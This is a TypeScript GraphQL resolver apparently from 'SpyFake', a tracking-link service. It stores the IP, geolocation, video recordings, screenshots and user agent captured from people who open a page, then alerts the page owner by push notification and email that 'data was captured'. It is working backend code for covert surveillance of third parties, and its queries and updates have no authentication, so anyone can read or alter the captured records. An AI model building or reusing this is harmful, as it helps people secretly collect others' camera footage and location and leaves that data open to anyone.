import { Arg, ID, Mutation, Query, Resolver } from "type-graphql";
import { DataUserModel } from "../dtos/models/data-user-models";
import { CreateDataUserInput } from "../dtos/inputs/create-data-user-input";
import { DataUser } from "../database/models/DataUser";
import { UpdateDataUserInput } from "../dtos/inputs/update-data-user-input";
import { UserClient } from "../database/models/UserClient";
import { sendEmail } from "../adapters/mailgun";
import { getMessaging } from 'firebase-admin/messaging';
import { firebaseMessaging } from "../adapters/firebase";

@Resolver(() => DataUserModel)
export class DataUserResolver {
  @Query(() => [DataUserModel])
  async dataUser(@Arg('tokenPage') tokenPage: string, @Arg('randomUser') randomUser: string) {
    // pesquisar o usuário randomUser junto com o slug
    const dataUsers = await DataUser.find({ tokenPage: tokenPage, randomUser: randomUser });

    if (!dataUsers) { throw new Error("Page not found") }

    const dataUser = dataUsers.map((item) => {
      return {
        emailOwner: item.emailOwner,
        randomUser: item.randomUser,
        tokenPage: item.tokenPage,
        id: item._id,
        ip: item.ip,
        slug: item.slug,
        currentDateTime: item.currentDateTime,
        geoLocation: item.geoLocation,
        video: item.video,
        screenshot: item.screenshot,
        screenshot2: item.screenshot2,
        screenshot3: item.screenshot3,
        userAgent: item.userAgent,
        viewed: item.viewed,
        videoMp4: item.videoMp4,
      }
    });

    return dataUser
  }
  @Mutation(() => DataUserModel)
  async createDataUser(@Arg('data') data: CreateDataUserInput) {
    // decodificar token do usuário
    const randomUser = data.randomUser

    const user = await UserClient.findOne({ randomUser: randomUser })

    if (!user) { throw new Error("User not found") }

    const dataUserData = {
      emailOwner: user.email,
      randomUser: user.randomUser,
      tokenPage: data.tokenPage,
      ip: data.ip,
      slug: data.slug,
      currentDateTime: data.currentDateTime,
      geoLocation: data.geoLocation,
      video: data.video,
      screenshot: data.screenshot,
      screenshot2: data.screenshot2,
      screenshot3: data.screenshot3,
      userAgent: data.userAgent,
    }

    const dataUser = new DataUser(dataUserData);
    const registrationToken = user.tokenNotification

    const message = {
      data: {
        score: '850',
        time: '2:45',
        link: 'https://abrir.ink/dashboard'
      },
      token: registrationToken!,
      notification: {
        title: 'Novidades na investigação',
        body: 'Acesse SpyFake para visualizar as ultimas capturas'
      },
      android: {
        notification: {
          sound: 'default'
        }
      },
      apns: {
        payload: {
          aps: {
            sound: 'default'
          }
        }
      },
    };

    try {
      await dataUser.save()
      if (registrationToken) {
        await firebaseMessaging.send(message)
      }
      await sendEmail(user.email, "Dados Capturados", `
      <html>
      <head>
        <style>
          body {
            font-family: Arial, sans-serif;
          }
          .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 8px;
            background-color: #f9f9f9;
          }
          .message {
            font-size: 16px;
            line-height: 1.6;
            color: #333;
          }
          .button {
            display: inline-block;
            font-size: 16px;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            background-color: #007bff;
            color: #fff;
            border-radius: 4px;
            cursor: pointer;
          }
          .button:hover {
            background-color: #0056b3;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="message">
            <p>Captura de dados feita com sucesso!</p>
            <p>Acesse a plataforma para visualizar os dados capturados.</p>
          </div>
          <p>Equipe spyfake</p>
        </div>
      </body>
    </html>    
      `)

    } catch (error) {

      console.log(error)
    }
    return {
      id: dataUser._id,
      ...dataUserData
    };
  }

  @Mutation(() => DataUserModel)
  async updateDataUser(@Arg("data") data: UpdateDataUserInput) {
    try {
      const updatedDataUser = await DataUser.findByIdAndUpdate(
        data.id,
        {
          $set: {
            geoLocation: data.geoLocation,
            video: data.video,
            screenshot: data.screenshot,
            currentDateTime: data.currentDateTime,
            ip: data.ip,
            screenshot2: data.screenshot2,
            screenshot3: data.screenshot3,
            userAgent: data.userAgent,
          }
        },
        { new: true }
      );

      if (!updatedDataUser) {
        throw new Error("Documento não encontrado");
      }

      return {
        id: updatedDataUser._id,
        ...updatedDataUser.toObject(),
      };
    } catch (error) {
      console.error("Erro ao atualizar documento:", error);
      throw error;
    }
  }

  @Query(() => [DataUserModel])
  async dataUsersByEmail(@Arg('email') email: string) {
    const dataUsers = await DataUser.find({ emailOwner: email });

    if (!dataUsers) { throw new Error("Page not found") }

    const dataUser = dataUsers.map((item) => {
      return {
        emailOwner: item.emailOwner,
        randomUser: item.randomUser,
        tokenPage: item.tokenPage,
        id: item._id,
        ip: item.ip,
        slug: item.slug,
        currentDateTime: item.currentDateTime,
        geoLocation: item.geoLocation,
        video: item.video,
        screenshot: item.screenshot,
        screenshot2: item.screenshot2,
        screenshot3: item.screenshot3,
        userAgent: item.userAgent,
        viewed: item.viewed
      }
    });

    return dataUser
  }

  // mutation para atualizar o campo viewed para true
  @Mutation(() => DataUserModel)
  async updateViewedDataUser(@Arg("id", () => ID) id: string) {
    const dataUsers = await DataUser.findById(id);

    if (!dataUsers) { throw new Error("Page not found") }

    try {
      // atualizar o campo viewed para true
      const updatedDataUser = await DataUser.findByIdAndUpdate(
        id,
        {
          $set: {
            viewed: true
          }
        },
        { new: true }
      );


      if (!updatedDataUser) {
        throw new Error("Documento não encontrado");
      }

      return {
        id: updatedDataUser._id,
        ...updatedDataUser.toObject(),
      };
    } catch (error) {
      console.error("Erro ao atualizar documento:", error);
      throw error;
    }
  }
}